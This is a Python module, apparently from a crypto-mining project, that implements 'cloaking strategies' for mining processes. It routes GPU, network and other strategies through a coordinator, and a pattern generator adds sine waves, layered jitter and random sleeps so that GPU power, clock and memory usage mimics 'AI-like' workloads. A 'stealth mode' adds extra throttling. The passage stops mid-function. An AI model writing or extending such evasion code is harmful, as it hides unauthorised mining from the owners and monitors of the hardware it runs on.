"""
**Module cloak_strategies.py** - Các **cloaking strategies** (chiến lược ngụy trang – phương pháp che giấu) cho **mining processes** (tiến trình khai thác – quy trình đào coin) (đồng bộ).
**CHÚ Ý**: Phiên bản này đã loại bỏ hoàn toàn chức năng **restoration** (khôi phục – phục hồi) - chỉ **cloaking** (ngụy trang – che giấu).
"""
# type: ignore

import logging
import traceback
import psutil
import threading
import time
import random
# **ABC removed** (đã xóa ABC – loại bỏ Abstract Base Classes) - không còn cần sau khi xóa **CloakStrategy base class** (lớp cơ sở CloakStrategy)
from typing import Dict, List, Any, Optional, Type, cast, TYPE_CHECKING
from pathlib import Path

from .utils import MiningProcess, StrategyType

# ✅ **UNIFIED LOGGING** (ghi nhật ký thống nhất): Sử dụng **centralized logging system** (hệ thống ghi nhật ký tập trung – cơ chế log trung tâm)
from .module_loggers import get_gpu_cloaking_logger

# ✅ **ERROR MANAGEMENT** (quản lý lỗi): Sử dụng **centralized error handling system** (hệ thống xử lý lỗi tập trung – cơ chế quản lý ngoại lệ trung tâm)
from .error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error

# ✅ **STANDARDIZED** (chuẩn hóa): Lấy **unified logger instance** (thực thể logger thống nhất – đối tượng ghi nhật ký đồng bộ) (khớp **hierarchy** – phân cấp)
cloak_logger = get_gpu_cloaking_logger()

# ✅ **ERROR REPORTER** (báo cáo lỗi): Lấy **centralized error reporter instance** (thực thể báo cáo lỗi tập trung – đối tượng báo lỗi trung tâm)
error_reporter = get_error_reporter()

# **GPU-Only Mode** (chế độ chỉ GPU – hoạt động riêng card đồ họa): **CPU ResourceManager removed** (đã xóa trình quản lý tài nguyên CPU) cho **GPU-only operations** (hoạt động chỉ GPU – thao tác riêng card đồ họa)
if TYPE_CHECKING:
    class GPUResourceManager: ...
    class NetworkResourceManager: ...
    class DiskIOResourceManager: ...
    class CacheResourceManager: ...
    class MemoryResourceManager: ...
else:
    GPUResourceManager = Any  # type: ignore
    NetworkResourceManager = Any  # type: ignore
    DiskIOResourceManager = Any  # type: ignore
    CacheResourceManager = Any  # type: ignore
    MemoryResourceManager = Any  # type: ignore


###############################################################################
#                         **SIMPLIFIED CLOAK COORDINATOR** (BỘ ĐIỀU PHỐI NGỤY TRANG ĐƠN GIẢN HÓA)                        #
###############################################################################

from .utils import CloakRequest, CloakResult
from .resource_control import HardwareController

class CloakCoordinator:
    """
    **Simple coordinator** (bộ điều phối đơn giản – trình phối hợp cơ bản) - không có **complex factory** (factory phức tạp – nhà máy tạo đối tượng) hoặc **abstract strategies** (chiến lược trừu tượng – phương pháp tổng quát).
    **Pipeline Stage 2** (Giai đoạn 2 của pipeline – bước 2 trong quy trình): Nhận **CloakRequest** (yêu cầu ngụy trang) từ **ResourceManager** (trình quản lý tài nguyên) -> Chọn **strategy** (chiến lược) -> Gọi **HardwareController** (bộ điều khiển phần cứng).
    """
    
    def __init__(self, config: Dict[str, Any]):
        """
        **Initialize CloakCoordinator** (khởi tạo CloakCoordinator – thiết lập bộ điều phối ngụy trang) với **config** (cấu hình).
        
        :param config: **Configuration dictionary** (từ điển cấu hình – dict thiết lập)
        """
        self.config = config
        self.logger = cloak_logger  # Sử dụng **existing logger** (logger hiện có – bộ ghi nhật ký sẵn có)
        
        # **Initialize hardware controller** (khởi tạo bộ điều khiển phần cứng) cho **Stage 3** (giai đoạn 3)
        self.hw_controller = HardwareController(config)
        
        self.logger.info("[CS] **CloakCoordinator initialized** (CloakCoordinator đã khởi tạo – bộ điều phối ngụy trang đã thiết lập) - **Stage 2 ready** (giai đoạn 2 sẵn sàng)")
    
    def process_request(self, request: CloakRequest) -> CloakResult:
        """**Stage 2: Strategy Coordinator** (Giai đoạn 2: Điều phối chiến lược – bộ phối hợp phương pháp)
        
        **Trách nhiệm chính** (main responsibilities – nhiệm vụ chủ yếu) của **Stage 2** (giai đoạn 2):
        1. Quyết định **strategy** (chiến lược) dựa trên **config** (cấu hình)
        2. Chuẩn bị **params** (tham số) cho **strategy** đó
        3. **Forward** (chuyển tiếp) đến **hardware controller** (bộ điều khiển phần cứng)
        
        :param request: **CloakRequest** (yêu cầu ngụy trang) từ **ResourceManager** (trình quản lý tài nguyên) (chỉ có **PID** & **metadata** – mã tiến trình & siêu dữ liệu)
        :return: **CloakResult** (kết quả ngụy trang) từ **HardwareController** (bộ điều khiển phần cứng)
        """
        try:
            # **Stage 2** quyết định **strategy** (chiến lược) (không phải **Stage 1**!)
            strategy = request.strategy_name
            if not strategy:
                # **Auto-select strategy** (tự động chọn chiến lược) dựa trên **config** (cấu hình)
                strategy = getattr(self.config, 'default_strategy', 'gpu')
                self.logger.info(f"[CS] **Auto-selected strategy** (đã tự động chọn chiến lược) '{strategy}' từ **config** (cấu hình)")
            
            self.logger.info(f"[CS] **Stage 2**: Đang xử lý **PID** {request.pid} (mã tiến trình) với **strategy** '{strategy}' (chiến lược)")
            
            # **Route** (định tuyến – chuyển hướng) đến **correct strategy handler** (bộ xử lý chiến lược đúng – trình xử lý phương pháp phù hợp)
            if strategy == 'gpu':
                # Chuẩn bị **GPU params** (tham số GPU – thông số card đồ họa) từ **config** (cấu hình)
                request.params = {
                    'gpu_index': 0,
                    'power_limit': getattr(self.config, 'gpu_power_limit', 150),
                    'memory_clock': getattr(self.config, 'gpu_memory_clock', 810),
                    'sm_clock': getattr(self.config, 'gpu_sm_clock', 1200),
                    'temp_threshold': getattr(self.config, 'gpu_temp_threshold', 75)
                }
                return self._apply_gpu_strategy(request)
                
            elif strategy == 'network':
                # Chuẩn bị **network params** (tham số mạng – thông số kết nối) từ **config** (cấu hình)
                request.params = {
                    'bandwidth_limit': getattr(self.config, 'network_bandwidth_limit', 100),
                    'interface': getattr(self.config, 'network_interface', 'eth0')
                }
                return self._apply_network_strategy(request)
                
            elif strategy == 'disk_io':
                # Chuẩn bị **disk I/O params** (tham số I/O đĩa – thông số nhập/xuất ổ cứng) (**placeholder** for now – tạm thời để trống)
                request.params = {}
                return self._apply_disk_io_strategy(request)
                
            elif strategy == 'cache':
                # Chuẩn bị **cache params** (tham số bộ nhớ đệm – thông số lưu trữ tạm) (**placeholder** – tạm thời để trống)
                request.params = {}
                return self._apply_cache_strategy(request)
                
            elif strategy == 'memory':
                # Chuẩn bị **memory params** (tham số bộ nhớ – thông số RAM) (**placeholder** – tạm thời để trống)
                request.params = {}
                return self._apply_memory_strategy(request)
                
            else:
                self.logger.error(f"[CS] **Unknown strategy** (chiến lược không xác định – phương pháp không nhận diện được): {strategy}")
                return CloakResult(
                    success=False,
                    pid=request.pid,
                    error_msg=f"**Unknown strategy** (chiến lược không xác định): {strategy}"
                )
                
        except Exception as e:
            self.logger.error(f"[CS] **Exception in process_request** (ngoại lệ trong process_request – lỗi khi xử lý yêu cầu): {e}")
            return CloakResult(
                success=False,
                pid=request.pid,
                error_msg=str(e)
            )
    
    def _apply_gpu_strategy(self, request: CloakRequest) -> CloakResult:
        """**Stage 2: Route GPU strategy** (Giai đoạn 2: Định tuyến chiến lược GPU) với **INTELLIGENT COORDINATOR** (bộ điều phối thông minh – trình phối hợp tự động)
        
        ✅ **ENHANCED** (nâng cao): Sử dụng **GpuCloakStrategy** làm **intelligent coordinator** (bộ điều phối thông minh)
        để thêm các **logic điều chỉnh động** (logic tự động điều chỉnh – thuật toán thích ứng) trước khi **forward** (chuyển tiếp) xuống **HardwareController** (bộ điều khiển phần cứng)
        
        :param request: **CloakRequest** (yêu cầu ngụy trang) với **GPU params** (tham số GPU) đã được **prepare** (chuẩn bị) ở **Stage 1** (giai đoạn 1)
        :return: **CloakResult** (kết quả ngụy trang) từ **HardwareController** (qua **intelligent coordinator** – bộ điều phối thông minh)
        """
        self.logger.info(f"[CS] 🎯 **Routing GPU strategy** (định tuyến chiến lược GPU – chuyển hướng phương pháp card đồ họa) qua **INTELLIGENT COORDINATOR** (bộ điều phối thông minh) cho **PID** {request.pid}")

        try:
            # Xóa phần lazy GPU plugin activation

            # Kiểm tra nếu **GpuCloakStrategy** khả dụng làm **intelligent coordinator** (bộ điều phối thông minh)
            if hasattr(self, 'gpu_cloak_strategy') and self.gpu_cloak_strategy:
                # **USE INTELLIGENT COORDINATOR** (sử dụng bộ điều phối thông minh)
                self.logger.info("[CS] 🧠 **Using GpuCloakStrategy as intelligent coordinator** (đang dùng GpuCloakStrategy làm bộ điều phối thông minh – sử dụng chiến lược GPU như trình phối hợp tự động)")

                # Chuẩn bị **request** (yêu cầu) cho **intelligent coordinator** (bộ điều phối thông minh)
                coordinator_request = {
                    'pid': request.pid,
                    'params': request.params
                }

                # Apply intelligent coordination (adds adaptive logic)
                coordinator_result = self.gpu_cloak_strategy.intelligent_apply(coordinator_request)

                # Convert result to CloakResult
                if coordinator_result.get('success'):
                    self.logger.info(f"[CS] ✅ Intelligent coordination successful for PID {request.pid}")
                    return CloakResult(
                        success=True,
                        pid=request.pid,
                        strategy_name='gpu_intelligent',
                        applied_params=coordinator_result.get('applied_params', request.params),
                        message=coordinator_result.get('message', 'GPU controls applied via intelligent coordinator')
                    )
                else:
                    # Check if emergency mode was activated
                    if coordinator_result.get('emergency_mode'):
                        self.logger.warning(f"[CS] 🚨 Emergency mode activated for PID {request.pid}")
                        return CloakResult(
                            success=True,  # Emergency mode is still "success"
                            pid=request.pid,
                            strategy_name='gpu_emergency',
                            applied_params=coordinator_result.get('params', {}),
                            message='Emergency GPU configuration applied'
                        )
                    else:
                        self.logger.error(f"[CS] ❌ Intelligent coordination failed: {coordinator_result.get('error')}")
                        # Fallback to direct hardware controller
                        self.logger.info("[CS] 🔄 Falling back to direct hardware controller")

            else:
                # No intelligent coordinator available, use direct routing
                self.logger.info("[CS] 📡 Direct routing to hardware controller (no intelligent coordinator)")

            # FALLBACK: Direct forward to hardware controller
            control_params = {
                'pid': request.pid,
                **request.params  # Forward ALL params as-is from Stage 1
            }

            result = self.hw_controller.apply_gpu_controls(control_params)

            if result.success:
                self.logger.info(f"[CS] ✅ GPU strategy routed successfully for PID {request.pid}")
            else:
                self.logger.error(f"[CS] ❌ GPU strategy routing failed: {result.error_msg}")

            return result

        except Exception as e:
            self.logger.error(f"[CS] ❌ GPU strategy exception: {e}")
            return CloakResult(
                success=False,
                pid=request.pid,
                strategy_name='gpu',
                error_msg=f"GPU strategy failed: {str(e)}"
            )
    
###############################################################################
#                 GPU STRATEGY: GpuCloakStrategy                              #
###############################################################################

import math
import json
from collections import deque
import os

class AdaptivePatternGenerator:
    """
    **Adaptive Pattern Generator** (Bộ tạo pattern thích ứng – tạo mẫu biến động tự điều chỉnh)
    Tạo các **AI-like patterns** (pattern giống AI – mẫu hoạt động như trí tuệ nhân tạo) cho GPU metrics
    không phụ thuộc vào **GPU plugins** (plugin GPU – phần mở rộng card đồ họa)
    """
    
    def __init__(self, profile: str = "medium"):
        """
        Initialize với **optimization profile** (hồ sơ tối ưu – cấu hình tối ưu hóa)
        :param profile: "light", "medium", hoặc "heavy"
        """
        self.logger = cloak_logger
        self.profile_name = profile
        self.config = self._load_config()
        self.profile = self.config['profiles'].get(profile, self.config['profiles']['medium'])
        
        # Pattern state tracking
        self.cycle_position = 0
        self.cycle_duration = self.profile['cycle_duration']
        self.pattern_history = deque(maxlen=100)
        self.baseline_power = None
        self.current_phase = "warmup"
        self.phase_timer = 0
        
        # Jitter và variation layers
        self.jitter_factor = self.profile['jitter_factor']
        self.power_variation = self.profile['power_variation']
        
        # Mean reversion parameters
        self.mean_reversion_strength = 0.7
        self.mean_reversion_threshold = 1.5
        
        self.logger.info(f"✅ [AdaptivePatternGenerator] Initialized với profile '{profile}'")
    
    def _load_config(self) -> Dict[str, Any]:
        """
        Load **configuration file** (file cấu hình – tệp thiết lập)
        """
        config_path = os.getenv('GPU_OPT_CONFIG', '/app/gpu_optimization_config.json')
        try:
            if os.path.exists(config_path):
                with open(config_path, 'r') as f:
                    return json.load(f)
        except Exception as e:
            self.logger.warning(f"⚠️ Cannot load config from {config_path}: {e}")
        
        # Default config nếu không load được
        return {
            'profiles': {
                'medium': {
                    'overhead_target': 0.12,
                    'power_variation': 0.12,
                    'vram_allocation': 0.50,
                    'jitter_factor': 0.25,
                    'cycle_duration': 90
                }
            },
            'safety': {
                'max_temperature': 78,
                'min_hashrate_retention': 0.85,
                'power_stddev_target': 5
            }
        }
    
    def generate_control_params(self, pid: int, current_metrics: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Generate **control parameters** (tham số điều khiển – thông số kiểm soát) cho mỗi cycle
        
        :param pid: Process ID cần apply
        :param current_metrics: Current GPU metrics (power, temp, vram, etc.)
        :return: Dict chứa các control parameters
        """
        # Update cycle position
        self.cycle_position += 1
        
        # Determine current phase
        self._update_phase()
        
        # Get baseline nếu chưa có
        if self.baseline_power is None and current_metrics:
            self.baseline_power = current_metrics.get('power', 150)
        elif self.baseline_power is None:
            self.baseline_power = 150  # Default 150W
        
        # Generate base parameters theo phase
        base_params = {
            'power_limit': self._calculate_power_target(),
            'sm_clock': self._calculate_sm_clock(),
            'memory_clock': 877,  # Keep stable
            'temp_threshold': self.config['safety']['max_temperature'],
            'vram_target': self._calculate_vram_target()
        }
        
        # Apply multi-layer variations
        varied_params = self._apply_variations(base_params)
        
        # Apply safety limits
        safe_params = self._apply_safety_limits(varied_params, current_metrics)
        
        # Log pattern metrics
        self._log_pattern_metrics(safe_params)
        
        return safe_params
    
    def _update_phase(self):
        """
        Update **current phase** (giai đoạn hiện tại – pha hoạt động)
        """
        self.phase_timer += 1
        
        if self.current_phase == "warmup" and self.phase_timer > 30:
            self.current_phase = "active"
            self.phase_timer = 0
            self.logger.info("📈 [Pattern] Transitioned to ACTIVE phase")
        elif self.current_phase == "active" and self.phase_timer > self.cycle_duration:
            self.current_phase = "cooldown"
            self.phase_timer = 0
            self.logger.info("📉 [Pattern] Transitioned to COOLDOWN phase")
        elif self.current_phase == "cooldown" and self.phase_timer > 20:
            self.current_phase = "active"
            self.phase_timer = 0
            self.logger.info("📈 [Pattern] Returned to ACTIVE phase")
    
    def _calculate_power_target(self) -> int:
        """
        Calculate **power target** (mục tiêu công suất – đích năng lượng) với mean-reverting random walk
        """
        base = self.baseline_power
        variation = self.power_variation
        
        if self.current_phase == "warmup":
            # Tăng dần từ 90% → 100%
            progress = min(1.0, self.phase_timer / 30)
            return int(base * (0.9 + 0.1 * progress))
            
        elif self.current_phase == "active":
            # Sinusoidal với jitter
            t = self.cycle_position
            sine = math.sin(2 * math.pi * t / 60)  # 60s period
            jitter = random.gauss(0, variation * 0.2)
            
            # Mean reversion
            target = base * (1 + variation * sine + jitter)
            if abs(target - base) > base * variation * self.mean_reversion_threshold:
                target = base + (target - base) * self.mean_reversion_strength
                
            return int(target)
            
        else:  # cooldown
            # Giảm dần về 95%
            return int(base * 0.95)
    
    def _calculate_sm_clock(self) -> int:
        """
        Calculate **SM clock target** (mục tiêu xung nhịp SM – tần số streaming multiprocessor)
        """
        base_clock = 1400  # Base SM clock
        
        if self.current_phase == "active":
            # Vary clock với pattern khác power
            t = self.cycle_position
            sine = math.sin(2 * math.pi * t / 45 + math.pi/4)  # Different phase
            variation = self.jitter_factor * 0.1  # 10% of jitter factor
            
            target = base_clock * (1 + variation * sine)
            return int(target)
        
        return base_clock
    
    def _calculate_vram_target(self) -> float:
        """
        Calculate **VRAM allocation target** (mục tiêu phân bổ VRAM – đích bộ nhớ video)
        """
        base_allocation = self.profile['vram_allocation']
        
        if self.current_phase == "active":
            # Rotating allocation pattern
            rotation = (self.cycle_position // 60) % 3
            variations = [0.9, 1.0, 1.1]
            return base_allocation * variations[rotation]
        
        return base_allocation
    
    def _apply_variations(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """
        Apply **multi-layer jitter** (jitter đa tầng – nhiễu nhiều lớp) và variations
        """
        # Layer 1: Frequency jitter (±20%)
        freq_jitter = random.uniform(0.8, 1.2)
        
        # Layer 2: Amplitude jitter (±15%)  
        amp_jitter = random.uniform(0.85, 1.15)
        
        # Layer 3: Phase shift mỗi 10-20 cycles
        if random.random() < 0.05:  # 5% chance
            phase_shift = random.uniform(-10, 10)
            if 'power_limit' in params:
                params['power_limit'] += phase_shift
                
        # Layer 4: Random micro-noise (±2%)
        for key in ['power_limit', 'sm_clock']:
            if key in params and params[key]:
                noise = random.uniform(0.98, 1.02)
                params[key] = int(params[key] * noise * amp_jitter)
                
        return params
    
    def _apply_safety_limits(self, params: Dict[str, Any], current_metrics: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Apply **safety limits** (giới hạn an toàn – ngưỡng bảo vệ) dựa trên current metrics
        """
        safety = self.config.get('safety', {})
        
        # Temperature-based throttling
        if current_metrics and 'temperature' in current_metrics:
            temp = current_metrics['temperature']
            max_temp = safety.get('max_temperature', 78)
            
            if temp > max_temp:
                # Reduce power proportionally
                reduction = min(0.3, (temp - max_temp) / 10)
                params['power_limit'] = int(params['power_limit'] * (1 - reduction))
                self.logger.warning(f"🌡️ High temp {temp}°C, reducing power by {reduction*100:.0f}%")
        
        # Ensure minimum power
        if params['power_limit'] < 50:
            params['power_limit'] = 50
        
        # Ensure valid clocks
        if params['sm_clock'] < 300:
            params['sm_clock'] = 300
        elif params['sm_clock'] > 2100:
            params['sm_clock'] = 2100
            
        return params
    
    def _log_pattern_metrics(self, params: Dict[str, Any]):
        """
        Log **pattern metrics** (chỉ số pattern – thông số mẫu) để monitoring
        """
        self.pattern_history.append({
            'timestamp': time.time(),
            'phase': self.current_phase,
            'params': params.copy()
        })
        
        # Log mỗi 30 entries
        if len(self.pattern_history) % 30 == 0:
            avg_power = sum(p['params'].get('power_limit', 0) for p in self.pattern_history) / len(self.pattern_history)
            self.logger.info(f"📊 [Pattern Stats] Phase: {self.current_phase}, Avg Power: {avg_power:.1f}W")


class GpuCloakStrategy:
    """
    ✅ UNIFIED: Comprehensive GPU cloaking với integrated thermal management:
      - Giới hạn power limit,
      - Set xung nhịp,
      - Integrated thermal monitoring và protection
      - Advanced thermal throttling với emergency protection
    
    UNIFIED strategy eliminates need for separate ThermalControlStrategy.
    """
    
    strategy_type = StrategyType.GPU
    
    # ✅ UNIFIED: Comprehensive cloaking attributes
    is_primary_strategy = True  # GPU cloaking is PRIMARY for GPU processes
    coordination_priority = 100  # Highest priority for GPU processes
    resource_conflicts = []  # ✅ NO CONFLICTS - integrated thermal management
    depends_on_strategies = []  # No dependencies
    supports_concurrent_application = True  # Safe to apply with other strategies
    estimated_application_time_ms = 400  # GPU + thermal control ~400ms
    requires_plugin_system = True  # GPU strategies require plugin system

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        gpu_resource_manager: GPUResourceManager = None,
        hw_controller: Any = None  # NEW: Accept HardwareController for intelligent coordination
    ):
        """
        ✅ ENHANCED: Intelligent Coordinator Constructor
        Khôi phục vai trò intelligent coordinator giữa CloakCoordinator và HardwareController
        :param config: Cấu hình cloaking GPU (dict).
        :param logger: Logger.
        :param gpu_resource_manager: ResourceManager liên quan đến GPU (optional, for backward compat).
        :param hw_controller: HardwareController instance for delegation (NEW).
        """
        self.logger = logger
        self.config = config
        self.hw_controller = hw_controller  # NEW: Store HardwareController reference
        
        # ✅ GPU OPTIMIZATION: Initialize AdaptivePatternGenerator nếu enabled
        gpu_opt_enabled = os.getenv('GPU_OPT_ENABLED', '0') == '1'
        if gpu_opt_enabled:
            gpu_opt_profile = os.getenv('GPU_OPT_PROFILE', 'medium')
            self.pattern_generator = AdaptivePatternGenerator(profile=gpu_opt_profile)
            self.logger.info(f"🎯 [GPU OPTIMIZATION] Enabled với profile '{gpu_opt_profile}'")
        else:
            self.pattern_generator = None
            self.logger.info("🔧 [GPU OPTIMIZATION] Disabled - using standard cloaking")

        # ✅ MULTI-LEVEL FALLBACK MECHANISM: 3 layers of GPU manager creation
        if gpu_resource_manager:
            self.gpu_resource_manager = self._initialize_gpu_manager_with_fallback(
                gpu_resource_manager, config, logger
            )
        else:
            # If no GPU manager provided, we'll rely on HardwareController
            self.gpu_resource_manager = None
            self.logger.info("🎯 [INTELLIGENT COORDINATOR] Operating in delegation mode via HardwareController")
        
        # ✅ CRITICAL VALIDATION: Skip if operating in delegation mode
        if self.gpu_resource_manager and not self._validate_gpu_manager_functionality():
            error_msg = "GPU cloaking strategy cannot operate without functional GPU manager"
            self.logger.error(f"💀 [CONSTRUCTOR] {error_msg}")
            raise RuntimeError(error_msg)

        self.stop_monitoring = False  # Thêm thuộc tính stop_monitoring

        # Process filtering configuration
        self.allowed_process_name = config.get("processes", {}).get("GPU", "")
        if not self.allowed_process_name:
            self.logger.debug("No specific GPU process filter configured, will apply to all processes")

        # ✅ INTELLIGENT SETTINGS: Adaptive throttling configuration
        self.stealth_mode = config.get('stealth_mode', False)
        if self.stealth_mode:
            self.throttle_percentage = 20  # Stealth: 80% power → 20% reduction
            self.logger.info("🔒 [STEALTH MODE] Activated - power_limit=80%, throttle=20%")
        else:
            self.throttle_percentage = config.get('throttle_percentage', 20)
            
        if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
            self.logger.warning("throttle_percentage GPU không hợp lệ, mặc định=20%.")
            self.throttle_percentage = 20

        # GPU Clock settings
        self.target_sm_clock = config.get('sm_clock', 1240)
        self.target_mem_clock = config.get('mem_clock', 877)
        
        # ✅ INTELLIGENT THERMAL MANAGEMENT
        self.gpu_temp_threshold = config.get('gpu_temp_threshold', 75)  # °C
        self.emergency_shutdown_temp = config.get('emergency_shutdown_temp', 90)  # °C
        self.thermal_throttle_step = config.get('thermal_throttle_step', 10)  # % reduction
        self.aggressive_cooling = config.get('aggressive_cooling', False)
        
        # ✅ INTELLIGENT FEATURES: Enable/disable flags
        self.enable_thermal_monitoring = config.get('enable_thermal_monitoring', True)
        self.thermal_check_interval = config.get('thermal_check_interval', 5)  # seconds
        self.adaptive_throttling = config.get('adaptive_throttling', True)
        self.smart_power_scaling = config.get('smart_power_scaling', True)
        self.emergency_fallback = config.get('emergency_fallback', True)
        self.enable_multi_gpu = config.get('enable_multi_gpu', True)

        self.temperature_threshold = config.get('temperature_threshold', 80)
        if self.temperature_threshold <= 0:
            self.logger.warning("temperature_threshold không hợp lệ, mặc định=80.")
            self.temperature_threshold = 80
    
    def intelligent_apply(self, request: Dict[str, Any]) -> Dict[str, Any]:
        """
        ✅ INTELLIGENT COORDINATOR: Điều phối thông minh giữa CloakCoordinator và HardwareController
        Thêm tất cả logic động mà GPUResourceManager thiếu:
        - Adaptive thermal throttling
        - Multi-GPU orchestration
        - Process filtering
        - Smart power scaling
        - Multi-tier fallback
        
        :param request: Dict containing pid and params from CloakCoordinator
        :return: Dict với status và enhanced params cho HardwareController
        """
        pid = request.get('pid')
        params = request.get('params', {})
        
        try:
            # ✅ GPU OPTIMIZATION: Sử dụng AdaptivePatternGenerator nếu enabled
            if self.pattern_generator:
                # Lấy current metrics nếu có
                current_metrics = self._get_current_gpu_metrics()
                
                # Generate adaptive control parameters
                adaptive_params = self.pattern_generator.generate_control_params(pid, current_metrics)
                
                # Merge với existing params
                params.update(adaptive_params)
                self.logger.debug(f"🎯 [Pattern] Applied adaptive params: {adaptive_params}")
                
                # Store generated params cho monitoring
                self._store_pattern_metrics(adaptive_params)
            # 1️⃣ PROCESS FILTERING (Logic GPUResourceManager thiếu)
            if self.allowed_process_name:
                # TODO: Get process name from pid and filter
                self.logger.debug(f"[INTELLIGENT] Process filtering enabled for '{self.allowed_process_name}'")
            
            # 2️⃣ MULTI-GPU DETECTION (Logic GPUResourceManager thiếu)
            gpu_count = self._detect_gpu_count()
            if self.enable_multi_gpu and gpu_count > 1:
                self.logger.info(f"🎮 [INTELLIGENT] Multi-GPU mode: {gpu_count} GPUs detected")
                params['multi_gpu'] = True
                params['gpu_count'] = gpu_count
            else:
                params['gpu_index'] = params.get('gpu_index', 0)
            
            # 3️⃣ ADAPTIVE THERMAL THROTTLING (Logic GPUResourceManager thiếu)
            if self.adaptive_throttling:
                params = self._apply_adaptive_thermal_logic(params)
            
            # 4️⃣ SMART POWER SCALING (Logic GPUResourceManager thiếu)
            if self.smart_power_scaling:
                params = self._apply_smart_power_scaling(params)
            
            # 5️⃣ PREPARE ENHANCED PARAMS
            enhanced_params = {
                'pid': pid,
                'power_limit': params.get('power_limit', 150),
                'sm_clock': params.get('sm_clock', self.target_sm_clock),
                'memory_clock': params.get('memory_clock', self.target_mem_clock),
                'temp_threshold': params.get('temp_threshold', self.gpu_temp_threshold),
                'fan_increase': params.get('fan_increase', 10),
                'enable_thermal': self.enable_thermal_monitoring,
                'adaptive_mode': self.adaptive_throttling,
                'multi_gpu': params.get('multi_gpu', False),
                'gpu_count': params.get('gpu_count', 1)
            }
            
            # 6️⃣ DELEGATE TO HARDWARE CONTROLLER WITH FALLBACK
            if self.hw_controller:
                result = self._delegate_with_fallback(enhanced_params)
            else:
                # Fallback to direct GPU manager if no HardwareController
                result = self._direct_gpu_apply(enhanced_params)

            # ✅ STEALTH: Random sleep sau khi áp dụng thành công
            if result.get('success'):
                self._apply_random_sleep_interval()
            return result
                
        except Exception as e:
            self.logger.error(f"❌ [INTELLIGENT] Coordination failed: {e}")
            if self.emergency_fallback:
                return self._emergency_fallback_apply(request)
            return {'success': False, 'error': str(e)}

    # ====================== INTELLIGENT COORDINATOR HELPER METHODS ======================

    def _apply_adaptive_thermal_logic(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """
        ✅ INTELLIGENT: Adaptive thermal throttling based on real-time temperature
        Tính toán động % giảm công suất dựa trên nhiệt độ thực tế
        """
        try:
            # Get current temperature (simulation for now, will be replaced with real GPU temp)
            current_temp = params.get('current_temp', 70)  # °C
            threshold = params.get('temp_threshold', self.gpu_temp_threshold)
            
            if current_temp > threshold:
                # ADAPTIVE FORMULA: 2% reduction per degree over threshold
                temp_overshoot = current_temp - threshold
                adaptive_throttle = min(50, int(temp_overshoot * 2))  # Max 50% reduction
                
                # Adjust power limit based on adaptive throttle
                current_power = params.get('power_limit', 150)
                new_power = int(current_power * (100 - adaptive_throttle) / 100)
                
                params['power_limit'] = new_power
                params['throttle_applied'] = adaptive_throttle
                
                self.logger.info(f"🌡️ [ADAPTIVE] Temp {current_temp}°C > {threshold}°C → {adaptive_throttle}% throttle → {new_power}W")
                
                # Emergency protection if temp too high
                if current_temp >= self.emergency_shutdown_temp:
                    params['emergency_mode'] = True
                    params['power_limit'] = 100  # Minimum safe power
                    self.logger.error(f"🚨 [EMERGENCY] Temp {current_temp}°C! Force power to 100W")
            
            return params
            
        except Exception as e:
            self.logger.error(f"❌ [ADAPTIVE] Thermal logic failed: {e}")
            return params
    
    def _apply_smart_power_scaling(self, params: Dict[str, Any]) -> Dict[str, Any]:
        """
        ✅ INTELLIGENT: Smart power scaling based on workload and config
        Điều chỉnh công suất thông minh dựa trên cấu hình và workload
        """
        try:
            # Check if low power GPU (skip throttling)
            current_power = params.get('power_limit', 150)
            if current_power <= 100:
                self.logger.info(f"⚡ [SMART] GPU already at {current_power}W, skip throttling")
                params['skip_throttle'] = True
                return params
            
            # Apply intelligent scaling
            if self.stealth_mode:
                # Stealth mode: More aggressive throttling
                params['power_limit'] = int(current_power * 0.6)  # 40% reduction
                self.logger.info(f"🔒 [STEALTH] Power reduced to {params['power_limit']}W")
            else:
                # Normal mode: Use configured throttle percentage
                reduction = self.throttle_percentage
                params['power_limit'] = int(current_power * (100 - reduction) / 100)
                self.logger.info(f"⚡ [SMART] Power adjusted to {params['power_limit']}W ({reduction}% reduction)")
            
            return params
            
        except Exception as e:
            self.logger.error(f"❌ [SMART] Power scaling failed: {e}")
            return params
    
    def _detect_gpu_count(self) -> int:
        """
        ✅ INTELLIGENT: Detect number of GPUs in system
        Phát hiện số lượng GPU trong hệ thống
        """
        try:
            # Try NVML first (most reliable)
            import pynvml
            pynvml.nvmlInit()
            count = pynvml.nvmlDeviceGetCount()
            pynvml.nvmlShutdown()
            return count
        except Exception:
            # Fallback to nvidia-smi
            try:
                result = os.popen("nvidia-smi -L | wc -l").read()
                return int(result.strip())
            except:
                return 1  # Default to 1 GPU
    
    def _get_current_gpu_metrics(self) -> Dict[str, Any]:
        """
        ✅ GPU OPTIMIZATION: Lấy current GPU metrics để feed vào pattern generator
        """
        metrics = {}
        try:
            # Try NVML để lấy real metrics
            import pynvml
            pynvml.nvmlInit()
            handle = pynvml.nvmlDeviceGetHandleByIndex(0)  # GPU 0
            
            # Power usage
            power = pynvml.nvmlDeviceGetPowerUsage(handle) / 1000  # mW to W
            metrics['power'] = power
            
            # Temperature
            temp = pynvml.nvmlDeviceGetTemperature(handle, pynvml.NVML_TEMPERATURE_GPU)
            metrics['temperature'] = temp
            
            # Memory info
            mem_info = pynvml.nvmlDeviceGetMemoryInfo(handle)
            metrics['vram_used'] = mem_info.used / (1024**3)  # bytes to GB
            metrics['vram_total'] = mem_info.total / (1024**3)
            
            # Clock speeds
            sm_clock = pynvml.nvmlDeviceGetClockInfo(handle, pynvml.NVML_CLOCK_SM)
            metrics['sm_clock'] = sm_clock
            
            pynvml.nvmlShutdown()
            
        except Exception as e:
            self.logger.debug(f"⚠️ Cannot get GPU metrics via NVML: {e}")
            # Return default metrics
            metrics = {
                'power': 150,
                'temperature': 65,
                'vram_used': 4.0,
                'vram_total': 8.0,
                'sm_clock': 1400
            }
        
        return metrics
    
    def _store_pattern_metrics(self, params: Dict[str, Any]):
        """
        ✅ GPU OPTIMIZATION: Store pattern metrics cho monitoring và analysis
        """
        try:
            # Store trong memory buffer hoặc file
            metrics_file = '/tmp/gpu_pattern_metrics.json'
            
            # Load existing metrics
            existing = []
            if os.path.exists(metrics_file):
                try:
                    with open(metrics_file, 'r') as f:
                        existing = json.load(f)
                except:
                    existing = []
            
            # Append new metrics với timestamp
            new_entry = {
